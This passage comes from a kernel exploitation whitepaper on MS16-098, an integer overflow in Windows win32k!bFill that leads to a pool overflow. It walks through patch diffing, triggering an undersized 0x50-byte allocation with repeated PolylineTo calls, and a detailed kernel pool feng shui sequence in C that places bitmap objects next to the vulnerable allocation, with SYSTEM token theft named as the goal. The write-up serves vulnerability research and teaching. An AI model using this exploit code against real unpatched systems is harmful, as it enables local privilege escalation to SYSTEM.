!
! !
!
pg.!33!
!
MS16-098 RGNOBJ Win32k!bFill Integer Overflow leading to Pool 
Overflow 
Understanding the Bug 
The MS16-098 update file was downloaded and expanded using Expand.exe. Then, binary diffing was 
performed between the new win32k.sys file version 6.3.9600.18405 and its older version, 
6.3.9600.17393, using IDA pro Zynamics BinDiff plugin. An interesting function was found to be 
modified with similarity rating 0.98. This function was win32k!bFill. Below is the difference between 
the two versions. 
The diff shows that an integer overflow was fixed, by adding the function UlongMult [11], which is 
used to detect integer overflows by multiplying the supplied two ULONG integers. If the result 
overflows 
the 
object 
type, 
which 
is 
a 
ULONG, 
it 
returns 
an 
error 
“INTSAFE_E_ARITHMETIC_OVERFLOW”. 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!34!
!
This function was added right before the call PALLOCMEM2 that was called with one of the checked 
arguments [rsp+Size]. This confirms that this integer overflow would lead to an allocation of a small 
sized object; the question then being – can this value be somehow controlled by the user? 
When faced with a big problem, its recommended to break it down into smaller problems. As kernel 
exploitation is a big problem, taking it one step at a time is the way to go. The exploitation steps are 
as follows: 
1. Reaching the vulnerable function. 
2. Controlling the allocation size. 
3. Kernel pool feng shui. 
4. Analysing and controlling the overflow. 
5. Abusing the Bitmap GDI objects. 
6. Fixing the overflowed header. 
7. Stealing SYSTEM Process Token from the EPROCESS structure. 
8. SYSTEM !! 
Reaching the Vulnerable Function 
First, we need to understand how this function can be reached by looking at the function definition in 
IDA. It can be seen that the function works on EPATHOBJ and the function name “bFill” would suggest 
that it has something to do with filling paths. A quick Google search for “msdn path fill” brought me 
to the function BeginPath and the using Paths example [12]. 
Theoretically speaking, if we take out the relevant code from the example, it should reach the 
vulnerable function. 
// Get Device context of desktop hwnd 
hdc = GetDC(NULL);  
// begin the drawing path 
BeginPath(hdc);  
// draw a line between the supplied points 
LineTo(hdc, nXStart + ((int) (flRadius * aflCos[i])), nYStart + ((int) 
(flRadius * aflSin[i])));  
// End the path 
EndPath(hdc); 
// Fill Path 
FillPath(hdc); 
That didn’t work so I started to dive into why by iterating backwards through the Xrefs to the 
vulnerable function and adding a break point in WinDbg, at the start of each of them. 
EngFastFill() -> bPaintPath() -> bEngFastFillEnum() -> Bfill() 
Running our sample code again, the first function that gets hit, and then doesn’t continue to the 
vulnerable function was EngFastFill. Without diving deep into reversing this function and adding more 
time of boring details to the reader we can say that, in short, this function is a switch case that will 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!35!
!
eventually call bPaintPath, bBrushPath, or bBrushPathN_8x8, depending if a brush object is associated 
with the hdc. The code above didn’t even reach the switch case, it failed before then, on a check that 
was made to check the device context DC type, thus it was worth investing in understanding Device 
Contexts types [13]. 
Looking at the information provided, it was worth trying to switch the device type to Memory(Bitmap) 
as follows: 
// Get Device context of desktop hwnd 
HDC hdc = GetDC(NULL); 
// Get a compatible Device Context to assign Bitmap to 
HDC hMemDC = CreateCompatibleDC(hdc); 
// Create Bitmap Object 
HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL); 
// Select the Bitmap into the Compatible DC 
HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap); 
//Begin path 
BeginPath(hMemDC); 
// draw a line between the supplied points. 
LineTo(hdc, nXStart + ((int) (flRadius * aflCos[i])), nYStart + ((int) 
(flRadius * aflSin[i])));          
// End the path 
EndPath(hMemDC); 
// Fill the path 
FillPath(hMemDC); 
Turns out, that was exactly what was needed to reach the vulnerable function bFill. 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!36!
!
Controlling the Allocation Size 
Looking at the code where the vulnerable allocation is made. 
Before the allocation is made, the function checks whether the value of [rbx+4] (rbx points to our 
first argument which is the EPATHOBJ), is larger than 14. If it was, then the same value is multiplied 
by 3 where the overflow happens. 
lea ecx, [rax+rax*2]; 
The overflow happens for two reasons: one, the value is being cast into the 32-bit register ecx and 
second, [rax+rax*2] means that the value is multiplied by 3. Doing some calculations, we can reach 
the conclusion that the value needed to overflow this function would be: 
0xFFFFFFFF / 3 = 0x55555555 
Any value greater than the value above, would overflow the 32-bit register. 
0x55555556 * 3 = 0x100000002 
Then the result of this multiplication is shifted left by a nibble 4-bits, usually a shift left by operation, is 
considered to be translated to multiplication by 2^4 
0x100000002 << 4 | 0x100000002 * 2^4) = 0x00000020 (32-bit register value) 
Still, there is no conclusion on how this value can be controlled, so I decided to read more posts about 
Windows GDI exploitation specially using PATH objects, to try and see if there was any mention to 
this. I stumbled upon this awesome blog post[14] by Nicolas Economou @NicoEconomou of 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!37!
!
CoreLabs, which was discussing the MS16-039 exploitation process. The bug discussed in this blog 
post had identical code to our current vulnerable function, as if someone copy pasted the code in 
these two functions. It is worth mentioning that it would have taken me much more time to figure out 
how to exploit this bug, without referencing this blog post, so for that I thank you @NicoEconomou. 
Continuing, the value was the number of points in the PATH object, and can be controlled by calling 
PolylineTo function multiple times. The modified code that would trigger an allocation of 50 Bytes 
would be: 
//Create a Point array  
static POINT points[0x3fe01]; 
// Get Device context of desktop hwnd 
HDC hdc = GetDC(NULL); 
// Get a compatible Device Context to assign Bitmap to 
HDC hMemDC = CreateCompatibleDC(hdc); 
// Create Bitmap Object 
HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL); 
// Select the Bitmap into the Compatible DC 
HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap); 
//Begin path 
BeginPath(hMemDC); 
// Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01. 
for (int j = 0; j < 0x156; j++) { 
PolylineTo(hMemDC, points, 0x3FE01); 
} 
} 
// End the path 
EndPath(hMemDC); 
// Fill the path 
FillPath(hMemDC); 
By calling PolylineTo with number of Points 0x3FE01 for 0x156 times would result in. 
0x156 * 0x3FE01 = 0x5555556 
Notice that the number is smaller than the number produced by the previous calculations, the reason 
is that in practice, when the bit is shifted left by 4, the lowest nibble will be shifted out of the 32-bit 
register, and what will be left is the small number. The other thing worth mentioning is that the 
application will add an extra point to our list of points, so the number that is passed to the overflowing 
instruction will be in reality 0x5555557. Let’s do the maths and see how it will work. 
0x5555557 * 0x3 = 0x10000005 
0x10000005 << 4 = 0x00000050 
By that point, the size of the allocation will be 50 bytes and the application will try to copy 0x5555557 
points to that small memory location resulting in a linear overflow of adjacent memory, which will 
quickly give us a BSOD, and with that successfully triggering the bug! 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!38!
!
Kernel Pool Feng Shui  
The idea is to force the allocation of our vulnerable object to be adjacent to an object under our 
control. The object of choice would be GDI Bitmaps, with pool tag Gh05, which is allocated to the 
same Page Session Pool and can be controlled using SetBitmapBits/GetBitmapBits to write/read to 
arbitrary memory locations. 
The crash happens because at the end of the bFill function, the allocated object is freed, when an 
object is freed, the kernel validates the adjacent memory chunks pool header; to check for corruption. 
Since we overflowed the adjacent page(s), this check will fail and a BSOD will happen. The trick to 
mitigate crashing on this check, is to force the allocation of our object at the end of memory page and 
control the overflow. This way, the call to free() will pass normally. 
Below is the flow of allocations/deallocations: 
HBITMAP bmp; 
// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of 
page. 
for (int k = 0; k < 5000; k++) { 
bmp = CreateBitmap(1670, 2, 1, 8, NULL);  
bitmaps[k] = bmp; 
} 
Start by 5000 allocations of Bitmap objects with size 0xf80. This will eventually start allocating new 
memory pages and each page will start with a Bitmap object of size 0xf80, leaving 0x80 bytes space at 
the end of the page. To check if the spray worked we can break on the call to PALLOCMEM from 
within bFill and use !poolused 0x8 Gh?5 to see how many bitmap objects were allocated. The other 
thing, is how to calculate the sizes which when supplied to the CreateBitmap() function translate into 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!39!
!
the Bitmap objects allocated by the kernel. The closest calculations I could find were mentioned by 
Feng yuan in his book[11]. It was a close calculation but doesn’t add up to the allocation sizes observed. 
By using the best way a hacker can know, trial and error, I changed the size of the bitmap and see the 
allocated size object that was allocated using !poolfind command. 
// Allocating 7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling 
in the space at end of page. 
HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000); 
HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000); 
for (INT i = 0; i < 7000; i++) { 
hAccel = CreateAcceleratorTableA(lpAccel, 1); 
hAccel2 = CreateAcceleratorTableW(lpAccel, 1); 
pAccels[i] = hAccel; 
pAccels2[i] = hAccel2; 
} 
Then, 7000 allocations of accelerator table objects (Usac). Each Usac is of size 0x40, so allocating two 
of them will allocate 0x80 bytes of memory. This, will fill the 0x80 bytes left from the previous 
allocation rounds and completely fill our pages (0xf80 + 80 = 0x1000). 
// Delete the allocated bitmaps to free space at beginning of pages 
for (int k = 0; k < 5000; k++) { 
DeleteObject(bitmaps[k]); 
} 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!40!
!
Next de-allocation of the previously allocated object will leave our memory page layout with 0xf80 
free bytes at the beginning of the page. 
// Allocate Gh04 5000 region objects of size 0xbc0 which will reuse the 
free-ed bitmaps memory. 
for (int k = 0; k < 5000; k++) { 
CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0 
} 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!41!
!
Allocating 5000 bytes of region objects (Gh04) of size 0xbc0. This size is essential, since if the bitmap 
was placed directly adjacent to our vulnerable object, overflowing it will not overwrite the interesting 
members of the Bitmap object, which can be abused. Also, the calculated size of the allocated object 
in relation to the arguments supplied to CreateEllipticRgn function, was found through trial and error. 
At this point of the feng shui, the kernel page has 0xbc0 Gh04 object in the beginning of the page, and 
0x80 at the end of the page, with free space of 0x3c0 bytes. 
// Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects 
previously allocated 
for (int k = 0; k < 5000; k++) { 
bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0 
bitmaps[k] = bmp; 
} 
The allocation of 5000 bitmap objects of size 0x3c0 to fill this freed memory, the bitmap objects 
becoming the target of our controlled overflow. 
// Allocate 1700 clipboard objects of size 0x60 to fill any free memory 
locations of size 0x60 
for (int k = 0; k < 1700; k++) { //1500 
AllocateClipBoard2(0x30); 
} 
Next part is the allocation of 1700 Clipboard objects (Uscb) of size 0x60, just to fill any memory 
locations that have size 0x60 prior to allocating our vulnerable object; so, when the object gets 
allocated, it almost certainly will fall into our memory layout. 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!42!
!
// Delete 2000 of the allocated accelerator tables to make holes at the 
end of the page in our spray. 
for (int k = 2000; k < 4000; k++) { 
DestroyAcceleratorTable(pAccels[k]); 
DestroyAcceleratorTable(pAccels2[k]); 
} 
The last step of our kernel pool feng shui, was to create holes in the allocated accelerator table objects 
(Usac), exactly 2000 holes. The kernel feng shui function is also called right before the bug is triggered, 
if all went well, our vulnerable object will be allocated into one of these holes right where its intended 
to be at the end of the memory page near a bitmap object. 
!